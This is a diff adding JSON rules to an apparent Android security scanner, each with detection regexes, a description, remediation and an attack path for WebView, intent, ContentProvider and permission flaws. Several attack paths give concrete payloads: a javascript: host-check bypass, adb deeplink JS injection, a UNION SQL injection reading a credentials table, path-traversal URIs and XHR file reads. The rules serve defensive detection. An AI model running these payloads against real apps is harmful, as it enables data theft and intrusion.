+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "deeplink", "xss", "critical", "oversecured"]
+    },
+    {
+      "id": "os-webview-javascript-scheme-bypass",
+      "title": "URL Validation Bypass via javascript: Scheme",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getHost\\s*\\(\\)[^}]*(?!getScheme)[^}]*loadUrl", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "endsWith\\s*\\([^)]*\\.com[^)]*\\)[^}]*loadUrl", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-939"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "medium"},
+      "description": "URL validation only checks host but not scheme. Attacker bypasses with javascript://legitimate.com/%0aalert(1) or file://legitimate.com/path to execute JS or read files.",
+      "attack_path": "**Bypass:** `javascript://trusted.com/%0aalert(document.cookie)` - Executes JS while passing host check",
+      "remediation": "Always validate BOTH scheme AND host:\n```java\nreturn \"https\".equals(uri.getScheme()) && ALLOWED_HOSTS.contains(uri.getHost());\n```",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "bypass", "xss", "oversecured"]
+    },
+    {
+      "id": "os-webview-evaluatejavascript-injection",
+      "title": "JavaScript Injection via evaluateJavascript Concatenation",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "evaluateJavascript\\s*\\(\\s*[\"'][^\"']*[\"']\\s*\\+", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "evaluateJavascript\\s*\\([^)]*getQueryParameter", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "evaluateJavascript\\s*\\([^)]*getStringExtra", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-94", "CWE-79"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "User input is concatenated into evaluateJavascript() call. Attacker injects: page='-alert(document.cookie)-' creating loadPage(''-alert(document.cookie)-'').",
+      "attack_path": "**Injection Attack:**\n```\nadb shell am start -d \"app://page?name='-alert(document.cookie)-'\"\n```",
+      "remediation": "Use JSON encoding for all external data:\n```java\nString safe = new JSONObject().put(\"page\", userInput).toString();\nwebView.evaluateJavascript(\"loadPage(\" + safe + \")\", null);\n```",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "xss", "injection", "critical", "oversecured"]
+    },
+    {
+      "id": "os-webview-intent-scheme-handler",
+      "title": "Unsafe intent:// Scheme Handler in WebView",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "Intent\\.parseUri\\s*\\([^)]*,\\s*(?:Intent\\.)?URI_INTENT_SCHEME", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "shouldOverrideUrlLoading[^}]*intent://[^}]*startActivity", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-940", "CWE-926"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/", "https://blog.oversecured.com/Android-Access-to-app-protected-components/"], "confidence": "high"},
+      "description": "WebView handles intent:// URLs and passes them to startActivity without validation. Attacker can launch arbitrary activities including non-exported ones via selector.",
+      "attack_path": "**Selector bypass:** `intent://x#Intent;SEL;component=com.victim/.SecretActivity;end`",
+      "remediation": "1. Remove component AND selector from parsed Intent\n2. Verify target is exported before launching\n```java\nintent.setComponent(null);\nintent.setSelector(null);\n```",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "intent", "redirect", "critical", "oversecured"]
+    },
+    {
+      "id": "os-webview-file-xhr-access",
+      "title": "WebView File Access via XHR Enabled",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "setAllowUniversalAccessFromFileURLs\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "setAllowFileAccessFromFileURLs\\s*\\(\\s*true\\s*\\)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-200", "CWE-552"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "WebView allows JavaScript from file:// URLs to make XHR requests to any file. Combined with URL injection, attacker can read all app files including databases and shared preferences.",
+      "attack_path": "**File Theft via XHR:**\n```javascript\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'file:///data/data/com.victim/databases/user.db', true);\n```",
+      "remediation": "Never enable these settings:\n```java\nsettings.setAllowFileAccessFromFileURLs(false);\nsettings.setAllowUniversalAccessFromFileURLs(false);\n```",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "file", "theft", "critical", "oversecured"]
+    },
+    {
+      "id": "os-intent-redirect-startactivity",
+      "title": "Intent Redirection via Parcelable Extra",
+      "severity": "Critical",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getParcelableExtra\\s*\\([^)]+\\)[^;]*;[^}]*startActivity\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "startActivity\\s*\\(\\s*\\([^)]*Intent[^)]*\\)\\s*get(?:Parcelable|Serializable)Extra", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-940", "CWE-926"], "references": ["https://blog.oversecured.com/Android-Access-to-app-protected-components/"], "confidence": "high"},
+      "description": "Exported component takes Intent from getParcelableExtra and passes to startActivity. Attacker accesses non-exported activities, steals files via URI permissions, or hijacks authentication flows. Over 80% of apps contain this vulnerability.",
+      "attack_path": "**Access Non-Exported Activity:**\nOuter intent to ExportedProxy, inner intent to SecretAdminActivity.",
+      "remediation": "1. Never pass Intent extras directly to startActivity\n2. Validate component belongs to your app",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "redirect", "critical", "oversecured"]
+    },
+    {
+      "id": "os-provider-path-traversal",
+      "title": "ContentProvider Path Traversal via URI Decoding",
+      "severity": "Critical",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getLastPathSegment\\s*\\(\\s*\\)[^}]*new\\s+File\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "uri\\.getPath\\s*\\(\\s*\\)[^}]*new\\s+File\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "openFile[^}]*new\\s+File\\s*\\([^)]*uri", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-22", "CWE-73"], "references": ["https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/"], "confidence": "high"},
+      "description": "ContentProvider uses uri.getLastPathSegment() or uri.getPath() directly in File constructor. URI decoding converts %2F to /, enabling ../ traversal to access any file.",
+      "attack_path": "**Path Traversal:** `content://com.victim.provider/files/..%2F..%2Fshared_prefs%2Fsecrets.xml`",
+      "remediation": "Re-encode the path segment or validate canonical path.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["provider", "traversal", "file", "critical", "oversecured"]
+    },
+    {
+      "id": "os-provider-sql-injection",
+      "title": "SQL Injection in ContentProvider Query",
+      "severity": "Critical",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "query\\s*\\([^)]*selection[^)]*\\)[^}]*rawQuery\\s*\\([^)]*selection", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "rawQuery\\s*\\([^,]*\\+[^,]*selection", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "execSQL\\s*\\([^)]*\\+[^)]*\\)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-89"], "references": ["https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/"], "confidence": "high"},
+      "description": "ContentProvider passes selection parameter directly to rawQuery without parameterization. Attacker extracts sensitive data from other tables via UNION injection.",
+      "attack_path": "**UNION Injection:**\n```\nadb shell content query --uri content://com.victim.provider/public --where \"1=2 UNION SELECT * FROM credentials --\"\n```",
+      "remediation": "Always use parameterized queries with selectionArgs.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["provider", "sqli", "injection", "critical", "oversecured"]
+    },
+    {
+      "id": "os-fileprovider-root-path",
+      "title": "FileProvider Exposes Root Path",
+      "severity": "Critical",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "<root-path[^>]*path\\s*=\\s*[\"'][\"']", "flags": "i", "file_types": [".xml"]},
+          {"pattern": "<root-path[^>]*name\\s*=", "flags": "i", "file_types": [".xml"]},
+          {"pattern": "<external-path[^>]*path\\s*=\\s*[\"'][\"']", "flags": "i", "file_types": [".xml"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-552", "CWE-200"], "references": ["https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/"], "confidence": "high"},
+      "description": "FileProvider file_paths.xml contains <root-path path=\"\"/> which exposes the entire filesystem, or <external-path path=\"\"/> exposing all external storage.",
+      "attack_path": "**Via Intent Redirect:** Use FileProvider URI to read any file with app's permissions.",
+      "remediation": "Never use root-path. Restrict to specific directories.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["fileprovider", "file", "theft", "critical", "oversecured"]
+    },
+    {
+      "id": "os-implicit-intent-interception",
+      "title": "Sensitive Data in Implicit Intent",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "new\\s+Intent\\s*\\(\\s*[\"'][^\"']+[\"']\\s*\\)[^}]*putExtra[^}]*(?:token|password|secret|auth|session|key|credential)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "sendBroadcast\\s*\\([^)]*new\\s+Intent\\s*\\(", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-927", "CWE-200"], "references": ["https://blog.oversecured.com/Interception-of-Android-implicit-intents/"], "confidence": "medium"},
+      "description": "App sends sensitive data via implicit Intent or broadcast. Malicious app registers matching intent-filter with high priority and intercepts the data.",
+      "attack_path": "**Attacker App:** Register receiver with priority 999, intercept all broadcasts with that action.",
+      "remediation": "1. Use explicit intents with setPackage() or setComponent()\n2. For broadcasts, use LocalBroadcastManager",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "broadcast", "interception", "oversecured"]
+    },
+    {
+      "id": "os-activity-result-uri-theft",
+      "title": "File Theft via startActivityForResult URI Interception",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "startActivityForResult\\s*\\([^)]*ACTION_(?:PICK|GET_CONTENT|OPEN_DOCUMENT)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "onActivityResult[^}]*getData\\s*\\(\\s*\\)[^}]*(?:copy|write|openInputStream)", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-200", "CWE-552"], "references": ["https://blog.oversecured.com/Android-security-checklist-theft-of-arbitrary-files/"], "confidence": "medium"},
+      "description": "App uses startActivityForResult for file picking and processes returned URI without validation. Attacker app intercepts with priority 999 and returns URI pointing to victim's private files.",
+      "attack_path": "Attacker app returns `file:///data/data/com.victim/shared_prefs/secrets.xml`, victim app copies it to external storage.",
+      "remediation": "Validate URI before processing - check it doesn't point to app's private data.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "file", "theft", "oversecured"]
+    },
+    {
+      "id": "os-permission-typo",
+      "title": "Permission Name Typo Creates Bypass",
+      "severity": "High",
+      "category": "Permission",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "android:permission\\s*=\\s*[\"'][^\"']*(?:PEMISSION|PERMISION|PERMMISSION|PERMSSION)[^\"']*[\"']", "flags": "i", "file_types": [".xml"]}]
+      },
+      "metadata": {"cwe": ["CWE-269", "CWE-862"], "references": ["https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/"], "confidence": "high"},
+      "description": "Permission name contains typo. Android creates new permission with default 'normal' protection level, allowing any app access to the protected component.",
+      "attack_path": "Declared: `com.app.USE_COOL_CAMERA` (signature level), Used: `com.app.USE_COOL_CAM` (typo - becomes normal level). Any app can now access.",
+      "remediation": "1. Use string resources for permission names\n2. Automated testing to verify permission enforcement",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["permission", "bypass", "typo", "oversecured"]
+    },
+    {
+      "id": "os-system-load-writable-path",
+      "title": "Native Library Loaded from Writable Path",
+      "severity": "Critical",
+      "category": "OWASP-M4-InputValidation",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "System\\.load\\s*\\([^)]*(?:getCacheDir|getFilesDir|getExternalFilesDir|getExternalCacheDir)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "System\\.load\\s*\\([^)]*\"/data/(?:data|user)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-426", "CWE-427"], "references": ["https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/"], "confidence": "high"},
+      "description": "App loads native library from writable directory (cache, files, external storage). If attacker can write to this path via another vulnerability, they achieve arbitrary code execution.",
+      "attack_path": "**Attack Chain:**\n1. Exploit path traversal to write malicious .so to app's cache dir\n2. App loads the library on next launch\n3. Attacker code executes with app's permissions",
+      "remediation": "1. Only load libraries from read-only paths (APK's lib directory)\n2. Use System.loadLibrary() instead of System.load()",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["native", "library", "rce", "critical", "oversecured"]
+    },
+    {
+      "id": "os-webview-cookie-poisoning",
+      "title": "WebView Cookie Poisoning via Attacker URL",
+      "severity": "High",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "CookieManager[^}]*setCookie\\s*\\([^)]*(?:getIntent|getStringExtra|getQueryParameter)", "flags": "ims", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-565", "CWE-384"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "App sets authentication cookies for URLs controlled by attacker. When attacker's URL is loaded, cookies (including auth tokens) are sent to attacker's server.",
+      "attack_path": "**Attack:**\n1. App receives attacker URL via deeplink\n2. App sets auth cookie for that URL\n3. WebView loads attacker URL\n4. Attacker server receives auth token in Cookie header",
+      "remediation": "Never set cookies for user-controlled URLs. Validate URL against trusted domains.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "cookie", "session", "oversecured"]
+    },
+    {
+      "id": "os-webview-file-chooser-interception",
+      "title": "WebView File Chooser Interception",
+      "severity": "High",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "onShowFileChooser[^}]*startActivityForResult[^}]*createIntent", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "onActivityResult[^}]*filePathCallback[^}]*onReceiveValue", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-200", "CWE-552"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "medium"},
+      "description": "WebView file chooser uses implicit intent. Attacker app intercepts with high priority and returns URI to victim's private files, which WebView uploads to the web page.",
+      "attack_path": "**Attacker returns:** `file:///data/data/com.victim/databases/secrets.db` - WebView uploads it to the web page.",
+      "remediation": "Validate returned URI belongs to safe locations.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["webview", "file", "chooser", "oversecured"]
+    },
+    {
+      "id": "os-provider-proxy-redirect",
+      "title": "ContentProvider Proxies Requests to Other Providers",
+      "severity": "Critical",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getContentResolver\\s*\\(\\s*\\)\\s*\\.\\s*(?:query|openFile|openInputStream)\\s*\\([^)]*(?:getQueryParameter|uri\\.get)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "Uri\\.parse\\s*\\([^)]*(?:getQueryParameter|getStringExtra)[^)]*\\)[^}]*getContentResolver", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-441", "CWE-918"], "references": ["https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/"], "confidence": "high"},
+      "description": "ContentProvider accepts URI parameter and queries another provider. Attacker can access any provider the app has permission to access, bypassing export restrictions.",
+      "attack_path": "**Attack:** `content://com.victim.proxy?uri=content://com.victim.private/secrets`",
+      "remediation": "Never use user-controlled URIs to query other providers.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["provider", "proxy", "redirect", "critical", "oversecured"]
+    }
+  ]
+}
